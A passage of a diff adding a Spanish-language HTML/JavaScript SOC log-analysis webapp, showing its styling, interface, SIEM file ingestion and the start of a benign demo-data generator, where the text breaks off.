@@ -1,0 +1,1548 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberSOC Analyzer ·<title Plataforma de Análisis de Ciberseguridad></title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/inter@5.0.16/index.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.0.18/index.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<style>
+:root{
+  --bg:#070b14; --panel:#0d1526; --panel2:#111c33; --border:#1e2c4a;
+  --txt:#e6edf7; --muted:#8ba0c2; --accent:#22d3ee; --accent2:#818cf8;
+  --crit:#ef4444; --high:#f97316; --med:#eab308; --low:#22c55e;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--txt);font-family:'Inter',system-ui,sans-serif;min-height:100vh}
+body::before{content:"";position:fixed;inset:0;background:
+  radial-gradient(600px 300px at 15% 0%,rgba(34,211,238,.07),transparent),
+  radial-gradient(700px 350px at 90% 10%,rgba(129,140,248,.07),transparent);pointer-events:none;z-index:0}
+.mono{font-family:'JetBrains Mono',monospace}
+header{position:relative;z-index:2;display:flex;align-items:center;gap:16px;flex-wrap:wrap;
+  padding:16px 28px;background:rgba(13,21,38,.85);border-bottom:1px solid var(--border);backdrop-filter:blur(8px)}
+.logo{width:44px;height:44px;flex:0 0 44px;border-radius:10px;background:linear-gradient(135deg,#0e2233,#122b45);
+  border:1px solid #1f3a5c;display:flex;align-items:center;justify-content:center}
+.logo svg{width:26px;height:26px}
+h1{font-size:19px;font-weight:700;letter-spacing:.3px}
+h1 span{color:var(--accent)}
+.sub{font-size:12px;color:var(--muted);margin-top:2px}
+.analyst-box{margin-left:auto;display:flex;align-items:center;gap:10px;background:var(--panel2);
+  border:1px solid var(--border);border-radius:10px;padding:8px 14px}
+.analyst-box label{font-size:12px;color:var(--muted)}
+.analyst-box input{background:#0a1120;border:1px solid var(--border);border-radius:7px;color:var(--txt);
+  padding:8px 10px;font-size:13px;width:220px;outline:none;font-family:'Inter',sans-serif}
+.analyst-box input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(34,211,238,.15)}
+nav{position:relative;z-index:2;display:flex;gap:8px;padding:14px 28px 0;flex-wrap:wrap}
+.step{display:flex;align-items:center;gap:10px;padding:10px 18px;border-radius:10px 10px 0 0;cursor:pointer;
+  background:transparent;border:1px solid transparent;border-bottom:none;color:var(--muted);font-size:13.5px;font-weight:600;transition:.2s}
+.step .num{width:24px;height:24px;border-radius:50%;background:var(--panel2);border:1px solid var(--border);
+  display:flex;align-items:center;justify-content:center;font-size:12px}
+.step:hover{color:var(--txt)}
+.step.active{background:var(--panel);border-color:var(--border);color:var(--accent)}
+.step.active .num{background:var(--accent);color:#04121a;border-color:var(--accent)}
+.step.done .num{background:rgba(34,211,238,.15);color:var(--accent);border-color:var(--accent)}
+main{position:relative;z-index:2;padding:0 28px 60px}
+section.panel{display:none;background:var(--panel);border:1px solid var(--border);border-radius:0 14px 14px 14px;
+  padding:26px;animation:fade .35s ease}
+section.panel.visible{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+h2.sec{font-size:17px;margin-bottom:4px;display:flex;align-items:center;gap:10px}
+h2.sec::before{content:"";width:4px;height:20px;border-radius:2px;background:linear-gradient(var(--accent),var(--accent2))}
+.p-sub{color:var(--muted);font-size:13px;margin-bottom:22px}
+.dropzone{border:2px dashed #2a3d63;border-radius:14px;padding:46px 20px;text-align:center;cursor:pointer;
+  transition:.25s;background:rgba(17,28,51,.4)}
+.dropzone:hover,.dropzone.drag{border-color:var(--accent);background:rgba(34,211,238,.05)}
+.dropzone svg{width:46px;height:46px;stroke:var(--accent);margin-bottom:12px}
+.dropzone p{font-size:14.5px;font-weight:600}
+.dropzone small{color:var(--muted);font-size:12px;display:block;margin-top:6px}
+.btn{display:inline-flex;align-items:center;gap:8px;border:none;border-radius:9px;padding:11px 20px;
+  font-size:13.5px;font-weight:700;cursor:pointer;transition:.2s;font-family:'Inter',sans-serif}
+.btn-primary{background:linear-gradient(135deg,#06b6d4,#6366f1);color:#fff}
+.btn-primary:hover{filter:brightness(1.15);transform:translateY(-1px)}
+.btn-ghost{background:var(--panel2);color:var(--txt);border:1px solid var(--border)}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent)}
+.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
+.btn-danger{background:linear-gradient(135deg,#dc2626,#f97316);color:#fff}
+.btn-sm{padding:7px 13px;font-size:12px}
+.row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+.fileinfo{margin-top:18px;background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:16px 18px;display:none}
+.fileinfo.show{display:block;animation:fade .3s}
+.fileinfo b{color:var(--accent)}
+.tbl-wrap{overflow:auto;border:1px solid var(--border);border-radius:10px;margin-top:14px;max-height:320px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{background:#0a1424;color:var(--accent);text-align:left;padding:9px 12px;position:sticky;top:0;
+  font-size:11px;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border)}
+td{padding:8px 12px;border-bottom:1px solid #15203a;color:#c3d0e4;vertical-align:top;max-width:340px;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+tr:hover td{background:rgba(34,211,238,.04)}
+.progress-wrap{display:none;margin:20px 0}
+.progress-wrap.show{display:block}
+.pbar{height:8px;background:#0a1424;border-radius:6px;overflow:hidden;border:1px solid var(--border)}
+.pbar>div{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .3s;border-radius:6px}
+.pstep{font-size:12.5px;color:var(--muted);margin-top:10px;font-family:'JetBrains Mono',monospace}
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin:16px 0}
+.chip{padding:7px 16px;border-radius:20px;border:1px solid var(--border);background:var(--panel2);
+  color:var(--muted);font-size:12.5px;font-weight:600;cursor:pointer;transition:.2s}
+.chip:hover{color:var(--txt)}
+.chip.active{border-color:var(--accent);color:var(--accent);background:rgba(34,211,238,.08)}
+.finding{border:1px solid var(--border);border-radius:12px;background:var(--panel2);margin-bottom:14px;overflow:hidden}
+.f-head{display:flex;align-items:flex-start;gap:14px;padding:16px 18px;cursor:pointer}
+.f-head:hover{background:rgba(34,211,238,.03)}
+.sev{font-size:10.5px;font-weight:800;padding:5px 11px;border-radius:6px;letter-spacing:.6px;text-transform:uppercase;white-space:nowrap}
+.sev.Crítico,.sev.Critico{background:rgba(239,68,68,.15);color:#f87171;border:1px solid rgba(239,68,68,.45)}
+.sev.Alto{background:rgba(249,115,22,.15);color:#fb923c;border:1px solid rgba(249,115,22,.45)}
+.sev.Medio{background:rgba(234,179,8,.13);color:#facc15;border:1px solid rgba(234,179,8,.4)}
+.sev.Bajo{background:rgba(34,197,94,.13);color:#4ade80;border:1px solid rgba(34,197,94,.4)}
+.sev.SinRiesgo{background:rgba(100,116,139,.13);color:#94a3b8;border:1px solid rgba(100,116,139,.4)}
+.f-title{font-size:14.5px;font-weight:700;line-height:1.35}
+.f-cat{font-size:11.5px;color:var(--muted);margin-top:4px;display:flex;gap:12px;flex-wrap:wrap}
+.f-body{display:none;padding:0 18px 18px;border-top:1px solid var(--border)}
+.f-body.open{display:block;animation:fade .3s}
+.f-block{margin-top:14px}
+.f-block h4{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--accent);margin-bottom:6px}
+.f-block p{font-size:13px;color:#c8d5e8;line-height:1.6}
+.f-block ul{margin:6px 0 0 18px;font-size:13px;color:#c8d5e8;line-height:1.7}
+pre.evi{background:#080f1d;border:1px solid #1a2947;border-radius:8px;padding:12px;font-size:11px;
+  color:#9fe8f5;overflow:auto;max-height:190px;line-height:1.55;font-family:'JetBrains Mono',monospace}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:22px}
+.stat{background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:16px 18px}
+.stat .v{font-size:26px;font-weight:800;color:var(--accent)}
+.stat .l{font-size:11.5px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
+.stat.crit .v{color:var(--crit)} .stat.high .v{color:var(--high)} .stat.med .v{color:var(--med)} .stat.low .v{color:var(--low)}
+.charts{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.chart-box{background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:16px}
+.chart-box h3{font-size:13px;color:var(--muted);margin-bottom:12px;font-weight:600}
+.chart-box canvas{max-height:260px}
+@media(max-width:900px){.charts{grid-template-columns:1fr}}
+.coverage{background:linear-gradient(135deg,rgba(34,211,238,.08),rgba(129,140,248,.08));border:1px solid #24406b;
+  border-radius:12px;padding:16px 20px;margin:18px 0;font-size:13.5px;line-height:1.8}
+.coverage b{font-size:15px}
+.coverage .c-crit{color:#f87171;font-weight:800}.coverage .c-alto{color:#fb923c;font-weight:800}
+.coverage .c-med{color:#facc15;font-weight:800}.coverage .c-bajo{color:#4ade80;font-weight:800}
+.coverage .c-ok{color:#94a3b8;font-weight:800}
+.searchbox{background:#0a1120;border:1px solid var(--border);border-radius:8px;color:var(--txt);padding:8px 12px;
+  font-size:13px;width:280px;outline:none;font-family:'Inter',sans-serif}
+.searchbox:focus{border-color:var(--accent)}
+.pager{display:flex;gap:10px;align-items:center;justify-content:center;margin-top:14px;font-size:13px;color:var(--muted)}
+.pager button{background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:7px;padding:6px 14px;cursor:pointer;font-size:12.5px}
+.pager button:hover:not(:disabled){border-color:var(--accent);color:var(--accent)}
+.pager button:disabled{opacity:.35;cursor:not-allowed}
+#reportContent{background:#f7f9fc;color:#12203a;border-radius:12px;padding:38px 44px;font-size:13.5px;line-height:1.65;overflow:auto}
+#reportContent h1{font-size:24px;color:#0b3a66;border-bottom:3px solid #06b6d4;padding-bottom:10px;margin-bottom:18px}
+#reportContent h2{font-size:17px;color:#0b3a66;margin:26px 0 10px}
+#reportContent h3{font-size:14px;color:#134e7a;margin:18px 0 6px}
+#reportContent p{margin-bottom:8px}
+#reportContent ul{margin:6px 0 10px 22px}
+#reportContent table{font-size:12px;margin:10px 0}
+#reportContent th{background:#0b3a66;color:#fff;position:static}
+#reportContent td{color:#25374f;border-bottom:1px solid #dde5ef}
+#reportContent pre{background:#0d1526;color:#9fe8f5;padding:12px;border-radius:8px;font-size:11px;overflow:auto;margin:8px 0}
+#reportContent .rp-sev{display:inline-block;font-size:10px;font-weight:800;padding:3px 9px;border-radius:5px;color:#fff;margin-left:8px}
+#reportContent details{border:1px solid #d4ddec;border-radius:8px;padding:10px 14px;margin:10px 0;background:#eef3fa}
+#reportContent summary{cursor:pointer;font-weight:700;color:#0b3a66;font-size:13px}
+#toast{position:fixed;bottom:26px;right:26px;z-index:99;display:flex;flex-direction:column;gap:10px}
+.toast{background:var(--panel2);border:1px solid var(--accent);border-left:4px solid var(--accent);
+  padding:13px 18px;border-radius:10px;font-size:13px;max-width:340px;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:fade .3s}
+.toast.err{border-color:var(--crit);border-left-color:var(--crit)}
+footer{position:relative;z-index:2;text-align:center;padding:20px;color:#4a5c7e;font-size:12px;border-top:1px solid var(--border)}
+.badge-ai{display:inline-flex;align-items:center;gap:6px;background:rgba(129,140,248,.12);border:1px solid rgba(129,140,248,.4);
+  color:#a5b4fc;font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px}
+.empty{text-align:center;color:var(--muted);padding:40px;font-size:14px}
+.cls-panel{margin-top:34px;border-top:1px solid var(--border);padding-top:24px}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#22d3ee" stroke-width="1.8">
+      <path d="M12 2l8 3.5v5c0 5.2-3.4 9.4-8 11-4.6-1.6-8-5.8-8-11v-5L12 2z" fill="rgba(34,211,238,.12)"/>
+      <path d="M9 12l2 2 4-4.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+  <div>
+    <h1>Cyber<span>SOC</span> Analyzer <span style="font-size:11px;color:var(--muted);font-weight:500">v2.5</span></h1>
+    <div class="sub">Webapp de análisis forense de eventos SIEM asistido por IA · Estocolmo, Suecia</div>
+  </div>
+  <div class="analyst-box">
+    <label for="analystName">👤 Analista SOC L2:</label>
+    <input id="analystName" type="text" placeholder="Nombre y apellido" autocomplete="name">
+  </div>
+</header>
+
+<nav>
+  <div class="step active" data-sec="carga" onclick="showSec('carga')"><span class="num">1</span> Carga de Archivos</div>
+  <div class="step" data-sec="analisis" onclick="showSec('analisis')"><span class="num">2</span> Análisis de Seguridad</div>
+  <div class="step" data-sec="dashboard" onclick="showSec('dashboard')"><span class="num">3</span> Dashboard</div>
+  <div class="step" data-sec="informe" onclick="showSec('informe')"><span class="num">4</span> Informe Técnico</div>
+</nav>
+
+<main>
+<!-- ===================== 1. CARGA ===================== -->
+<section class="panel visible" id="sec-carga">
+  <h2 class="sec">Carga de registros del SIEM</h2>
+  <p class="p-sub">Importa el archivo Excel/CSV entregado por el cliente. Los datos se procesan localmente en tu navegador; nada se envía a servidores externos.</p>
+  <div class="dropzone" id="dropzone" onclick="$('fileInput').click()">
+    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/>
+    </svg>
+    <p>Arrastra aquí el archivo de logs o haz clic para seleccionarlo</p>
+    <small>Formatos soportados: .xlsx · .xls · .csv · .txt (delimitado) — exportaciones de cualquier SIEM</small>
+  </div>
+  <input type="file" id="fileInput" accept=".xlsx,.xls,.csv,.txt" style="display:none">
+  <div class="row" style="margin-top:18px">
+    <button class="btn btn-ghost" onclick="loadDemo()">⚡ Cargar datos de demostración (incidente simulado)</button>
+    <button class="btn btn-ghost" onclick="downloadSampleXlsx()">📥 Descargar plantilla de ejemplo (.xlsx)</button>
+  </div>
+  <div class="fileinfo" id="fileinfo"></div>
+  <div id="previewWrap" style="display:none;margin-top:22px">
+    <h3 style="font-size:14px;color:var(--muted);margin-bottom:4px">Vista previa de los registros importados (primeras 8 filas)</h3>
+    <div class="tbl-wrap"><table id="previewTable"></table></div>
+    <div class="row" style="margin-top:20px">
+      <button class="btn btn-primary" onclick="showSec('analisis')">Continuar al análisis →</button>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== 2. ANÁLISIS ===================== -->
+<section class="panel" id="sec-analisis">
+  <h2 class="sec">Análisis de Seguridad <span class="badge-ai">✦ Motor IA · Detección + Correlación + Clasificación 100%</span></h2>
+  <p class="p-sub">El motor aplica reglas de detección (fuerza bruta, comandos sospechosos, inicios anómalos, movimiento lateral, escalamiento y otras anomalías), correlaciona los eventos por IP, usuario y equipo, y <b>clasifica individualmente cada uno de los registros</b> (Crítico / Alto / Medio / Bajo / Sin riesgo) para que ningún evento quede fuera del análisis.</p>
+  <div class="row">
+    <button class="btn btn-primary" id="btnAnalyze" onclick="runAnalysis()" disabled>🤖 Ejecutar análisis con IA</button>
+    <button class="btn btn-ghost" onclick="showSec('carga')">← Cambiar archivo</button>
+    <button class="btn btn-ghost" id="btnExportCls" onclick="exportClassificationXlsx()" style="display:none">📊 Exportar clasificación completa (.xlsx)</button>
+  </div>
+  <div class="progress-wrap" id="progressWrap">
+    <div class="pbar"><div id="pbarFill"></div></div>
+    <div class="pstep mono" id="pstepText">Iniciando…</div>
+  </div>
+  <div id="findingsArea" style="display:none">
+    <div class="coverage" id="coverageBar"></div>
+    <div class="row" style="justify-content:space-between;margin-top:10px">
+      <h3 style="font-size:15px">Hallazgos identificados (<span id="fCount">0</span>)</h3>
+      <span id="riskBadge"></span>
+    </div>
+    <div class="filters" id="sevFilters">
+      <div class="chip active" data-sev="Todos" onclick="filterFindings('Todos',this)">Todos</div>
+      <div class="chip" data-sev="Crítico" onclick="filterFindings('Crítico',this)">🔴 Crítico</div>
+      <div class="chip" data-sev="Alto" onclick="filterFindings('Alto',this)">🟠 Alto</div>
+      <div class="chip" data-sev="Medio" onclick="filterFindings('Medio',this)">🟡 Medio</div>
+      <div class="chip" data-sev="Bajo" onclick="filterFindings('Bajo',this)">🟢 Bajo</div>
+    </div>
+    <div id="findingsList"></div>
+
+    <!-- Clasificación individual de TODOS los eventos -->
+    <div class="cls-panel" id="clsPanel">
+      <div class="row" style="justify-content:space-between">
+        <h3 style="font-size:15px">Clasificación individual de eventos — cobertura total (<span id="clsTotal">0</span> registros)</h3>
+      </div>
+      <p class="p-sub" style="margin:6px 0 0">Cada registro del archivo recibió un nivel de riesgo y su justificación. Ningún evento queda fuera del informe: la tabla completa también se exporta a Excel y se anexa al PDF.</p>
+      <div class="filters" id="clsFilters" style="margin-top:14px">
+        <div class="chip active" onclick="filterCls('Todos',this)">Todos</div>
+        <div class="chip" onclick="filterCls('Crítico',this)">🔴 Crítico</div>
+        <div class="chip" onclick="filterCls('Alto',this)">🟠 Alto</div>
+        <div class="chip" onclick="filterCls('Medio',this)">🟡 Medio</div>
+        <div class="chip" onclick="filterCls('Bajo',this)">🟢 Bajo</div>
+        <div class="chip" onclick="filterCls('Sin riesgo',this)">⚪ Sin riesgo</div>
+        <input class="searchbox" id="clsSearch" type="text" placeholder="🔍 Buscar por IP, usuario, equipo, texto…" oninput="clsState.q=this.value.trim().toLowerCase();clsState.page=1;drawClass()">
+      </div>
+      <div class="tbl-wrap" style="max-height:480px"><table id="clsTable"></table></div>
+      <div class="pager">
+        <button id="clsPrev" onclick="clsState.page--;drawClass()">← Anterior</button>
+        <span id="clsPageInfo" class="mono"></span>
+        <button id="clsNext" onclick="clsState.page++;drawClass()">Siguiente →</button>
+      </div>
+    </div>
+  </div>
+  <div class="empty" id="analysisEmpty">Aún no se ha ejecutado el análisis. Carga un archivo en el paso 1 y presiona «Ejecutar análisis con IA».</div>
+</section>
+
+<!-- ===================== 3. DASHBOARD ===================== -->
+<section class="panel" id="sec-dashboard">
+  <h2 class="sec">Dashboard de estadísticas</h2>
+  <p class="p-sub">Métricas interactivas del conjunto de eventos y de los hallazgos por criticidad, categoría y línea de tiempo. Cobertura de clasificación: 100% de los registros.</p>
+  <div class="cards" id="statCards"></div>
+  <div class="charts">
+    <div class="chart-box"><h3>Hallazgos por criticidad</h3><canvas id="chSev"></canvas></div>
+    <div class="chart-box"><h3>Hallazgos por categoría de ataque</h3><canvas id="chCat"></canvas></div>
+    <div class="chart-box"><h3>Clasificación de riesgo de TODOS los eventos (cobertura 100%)</h3><canvas id="chRisk"></canvas></div>
+    <div class="chart-box"><h3>Top IPs de origen involucradas en hallazgos</h3><canvas id="chIps"></canvas></div>
+    <div class="chart-box" style="grid-column:1/-1"><h3>Eventos registrados vs. eventos sospechosos por hora</h3><canvas id="chTime"></canvas></div>
+  </div>
+  <div class="row" style="margin-top:22px">
+    <button class="btn btn-primary" onclick="showSec('informe')">Ir al informe técnico →</button>
+  </div>
+</section>
+
+<!-- ===================== 4. INFORME ===================== -->
+<section class="panel" id="sec-informe">
+  <h2 class="sec">Informe Técnico <span class="badge-ai">✦ Redacción asistida por IA</span></h2>
+  <p class="p-sub">Documento estructurado generado a partir de los hallazgos corroborados en los logs, con anexo de clasificación individual de todos los eventos sospechosos. Verifica el contenido y expórtalo a PDF.</p>
+  <div class="row" style="margin-bottom:18px">
+    <button class="btn btn-danger" id="btnPdf" onclick="exportPDF()" disabled>📄 Exportar informe a PDF (con anexo completo)</button>
+    <button class="btn btn-ghost" onclick="exportClassificationXlsx()" id="btnExportCls2" style="display:none">📊 Clasificación completa (.xlsx)</button>
+    <button class="btn btn-ghost" onclick="window.print()">🖨️ Imprimir / PDF del navegador</button>
+  </div>
+  <div id="reportContent"><div class="empty" style="color:#5a6b85">Ejecuta primero el análisis para generar el informe.</div></div>
+</section>
+</main>
+
+<footer>CyberSOC Analyst · Herramienta de apoyo al analista SOC L2 — Los hallazgos se derivan exclusivamente de los registros proporcionados por el cliente. · Estocolmo 🇸🇪</footer>
+<div id="toast"></div>
+
+<script>
+/* ============================================================
+   ESTADO GLOBAL
+============================================================ */
+const $ = id => document.getElementById(id);
+const state = {
+  analyst:'', fileName:'', rows:[], findings:[], chains:[], rowClass:[],
+  analyzed:false, suspiciousIdx:new Set(), iocs:{ips:new Set(),users:new Set(),hosts:new Set(),cmds:new Set()},
+  meta:{minTs:null,maxTs:null,totalRows:0,users:new Set(),ips:new Set(),hosts:new Set()}
+};
+const charts = {};
+const SEV_ORDER = ['Crítico','Alto','Medio','Bajo'];
+const SEV_RGB = {'Crítico':[239,68,68],'Alto':[249,115,22],'Medio':[234,179,8],'Bajo':[34,197,94]};
+const KILL_ORDER = {'Fuerza Bruta':1,'Inicios Sospechosos':2,'Comandos y Procesos':3,'Escalamiento':4,'Movimiento Lateral':5,'Otras Anomalías':6};
+const CATS = Object.keys(KILL_ORDER);
+const sevRank = s => SEV_ORDER.indexOf(s); // -1 = más severo que Bajo no aplica
+
+/* ============================================================
+   UTILIDADES UI
+============================================================ */
+function toast(msg,type='ok'){
+  const t=document.createElement('div'); t.className='toast'+(type==='err'?' err':''); t.textContent=msg;
+  $('toast').appendChild(t); setTimeout(()=>{t.style.opacity='0';t.style.transition='.4s';setTimeout(()=>t.remove(),400)},4200);
+}
+function showSec(name){
+  if(name!=='carga'){
+    if(!state.rows.length){ toast('Primero carga un archivo de logs (paso 1).','err'); name='carga'; }
+    else if(name!=='analisis' && !state.analyzed){ toast('Primero ejecuta el análisis con IA (paso 2).','err'); name='analisis'; }
+  }
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('visible'));
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  $('sec-'+name).classList.add('visible');
+  document.querySelector(`.step[data-sec="${name}"]`).classList.add('active');
+  if(name==='dashboard') renderDashboard();
+  if(name==='informe' && state.analyzed) renderReport();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function markDone(sec){ document.querySelector(`.step[data-sec="${sec}"]`).classList.add('done'); }
+function esc(s){ return String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtTs(d){ if(!d) return '—'; const p=n=>String(n).padStart(2,'0');
+  return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`; }
+
+/* ============================================================
+   INGESTA DE ARCHIVOS (XLSX / CSV)
+============================================================ */
+const dz=$('dropzone'), fi=$('fileInput');
+dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('drag')});
+dz.addEventListener('dragleave',()=>dz.classList.remove('drag'));
+dz.addEventListener('drop',e=>{e.preventDefault();dz.classList.remove('drag');handleFile(e.dataTransfer.files[0])});
+fi.addEventListener('change',e=>handleFile(e.target.files[0]));
+
+function handleFile(file){
+  if(!file) return;
+  const reader=new FileReader();
+  reader.onload=ev=>{
+    try{
+      const wb=XLSX.read(new Uint8Array(ev.target.result),{type:'array',cellDates:true});
+      const ws=wb.Sheets[wb.SheetNames[0]];
+      const json=XLSX.utils.sheet_to_json(ws,{defval:''});
+      if(!json.length){ toast('El archivo no contiene filas de datos legibles.','err'); return; }
+      ingestRows(json,file.name,file.size);
+      toast(`Archivo "${file.name}" importado correctamente (${json.length} filas).`);
+    }catch(err){ toast('Error al leer el archivo: '+err.message,'err'); }
+  };
+  reader.readAsArrayBuffer(file);
+}
+
+/* ---------- Normalización heurística de columnas ---------- */
+function pickKey(keys,pats){ for(const k of keys){ const lk=String(k).toLowerCase(); if(pats.some(p=>lk.includes(p))) return k; } return null; }
+function parseTs(v){
+  if(v instanceof Date && !isNaN(v)) return v;
+  if(typeof v==='number' && v>20000 && v<80000){ const d=new Date(Math.round((v-25569)*86400*1000)); if(!isNaN(d)) return d; }
+  const s=String(v??'').trim(); if(!s) return null;
+  let d=new Date(s); if(!isNaN(d)) return d;
+  const m=s.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{2,4})[ ,]+(\d{1,2}):(\d{2})(?::(\d{2}))?/);
+  if(m){ const y=+m[3]<50?2000+ +m[3]:+m[3]; d=new Date(y,+m[2]-1,+m[1],+m[4],+m[5],+(m[6]||0)); if(!isNaN(d)) return d; }
+  return null;
+}
+const IP_RE=/\b(\d{1,3}\.){3}\d{1,3}\b/g;
+
+function ingestRows(json,fileName,size){
+  const keys=Object.keys(json[0]);
+  const kTs=pickKey(keys,['timestamp','time','fecha','hora','date','@timestamp','_time','eventtime']);
+  const kUser=pickKey(keys,['user','usuario','account','cuenta','logon','samaccount','identidad']);
+  const kSrc=pickKey(keys,['srcip','sourceip','ip_origen','origen','source','clientip','client','ip source','src','attacker']);
+  const kHost=pickKey(keys,['host','equipo','destino','destination','computer','target','device','workstation','srv','ws-','dst']);
+  const kEvt=pickKey(keys,['event','description','mensaje','message','detalle','detail','title','nombre','action','operation']);
+  const kCmd=pickKey(keys,['command','comando','process','proceso','cmd','commandline','línea','linea']);
+
+  const rows=json.map((o,i)=>{
+    const raw=keys.map(k=>`${k}=${o[k]}`).join(' | ');
+    const txt=raw.toLowerCase();
+    let ts=kTs?parseTs(o[kTs]):null;
+    const user=kUser?String(o[kUser]).trim():'';
+    let srcIp=kSrc?String(o[kSrc]).trim():'';
+    if(!/^(\d{1,3}\.){3}\d{1,3}$/.test(srcIp)){ const m=raw.match(IP_RE); if(m) srcIp=m[0]; }
+    let dstHost=kHost?String(o[kHost]).trim():'';
+    const cmd=kCmd?String(o[kCmd]).trim():'';
+    const evt=kEvt?String(o[kEvt]).trim():'';
+    return {idx:i,ts,user,srcIp,dstHost,cmd,evt,raw,txt,riskCls:null};
+  });
+
+  state.rows=rows; state.fileName=fileName; state.analyzed=false; state.findings=[]; state.chains=[];
+  state.suspiciousIdx=new Set(); state.rowClass=[];
+  state.iocs={ips:new Set(),users:new Set(),hosts:new Set(),cmds:new Set()};
+  state.meta={minTs:null,maxTs:null,totalRows:rows.length,users:new Set(),ips:new Set(),hosts:new Set()};
+  rows.forEach(r=>{
+    if(r.ts){ if(!state.meta.minTs||r.ts<state.meta.minTs) state.meta.minTs=r.ts;
+              if(!state.meta.maxTs||r.ts>state.meta.maxTs) state.meta.maxTs=r.ts; }
+    if(r.user) state.meta.users.add(r.user);
+    if(r.srcIp) state.meta.ips.add(r.srcIp);
+    if(r.dstHost) state.meta.hosts.add(r.dstHost);
+  });
+
+  $('btnAnalyze').disabled=false;
+  $('btnExportCls').style.display='none'; $('btnExportCls2').style.display='none';
+  $('btnPdf').disabled=true;
+  const kb=size?(size/1024).toFixed(1)+' KB':'—';
+  $('fileinfo').classList.add('show');
+  $('fileinfo').innerHTML=`✅ <b>${esc(fileName)}</b> importado · ${rows.length} registros · ${kb} ·
+    Periodo: <span class="mono">${fmtTs(state.meta.minTs)} → ${fmtTs(state.meta.maxTs)}</span> ·
+    Columnas mapeadas: <span class="mono">[${['fecha:'+(kTs||'?'),'usuario:'+(kUser||'?'),'IP origen:'+(kSrc||'?'),'equipo:'+(kHost||'?'),'evento:'+(kEvt||'?'),'comando:'+(kCmd||'?')].join(', ')}]</span>`;
+  renderPreview(json,keys);
+  markDone('carga');
+}
+
+function renderPreview(json,keys){
+  const cols=keys.slice(0,7);
+  let html='<thead><tr><th>#</th>'+cols.map(c=>`<th>${esc(c)}</th>`).join('')+'</tr></thead><tbody>';
+  json.slice(0,8).forEach((o,i)=>{ html+=`<tr><td>${i+1}</td>`+cols.map(c=>`<td title="${esc(o[c])}">${esc(o[c])}</td>`).join('')+'</tr>'; });
+  html+='</tbody>';
+  $('previewTable').innerHTML=html;
+  $('previewWrap').style.display='block';
+}
+
+/* ============================================================
+   DATOS DE DEMOSTRACIÓN (incidente simulado para pruebas)
+============================================================ */
+function buildDemoRows(){
+  const R=[];
+  const push=(ts,u,ip,host,evt,desc,cmd)=>R.push({Timestamp:ts,Username:u,SourceIP:ip,Host:host,EventType:evt,Description:desc,CommandLine:cmd||''});
+  const users=['j.svensson','m.lindgren','a.novak','k.ericsson','svc_print','l.ferguson'];
+  const hosts=['WS-1001','WS-1042','WS-1077','SRV-DC01','SRV-FIN01','SRV-FILE01'];
+  for(let d=3;d<=5;d++){
+    for(let h=8;h<18;h++){
+      for(let n=0;n<3;n++){
+        const mm=String(Math.floor(Math.random()*60)).padStart(2,'0');
+        push(`2026-11-0${d} ${String(h).padStart(2,'0')}:${mm}:00`,users[Math.floor(Math.random()*users.length)],
+          `10.20.${30+Math.floor(Math.random()*8)}.1${Math.floor(Math.random()*9)}`,hosts[Math.floor(Math.random()*3)],
+          'Logon Success','Sesión iniciada correctamente (EventID 4624, Type 2 Interactive)','');
+        push(`2026-11-0${d} ${String(h).padStart(2,'0')}:${String((parseInt(mm)+5)%60).padStart(2,'0')}:00`,users[Math.floor(Math.random()*users.length)],
+          `10.20.3${Math.floor(Math.random()*9)}.11`,hosts[3+Math.floor(Math.random()*3)],'File Access','Acceso a recurso compartido de archivos (EventID 5140)','');
+      }
+    }
+  }
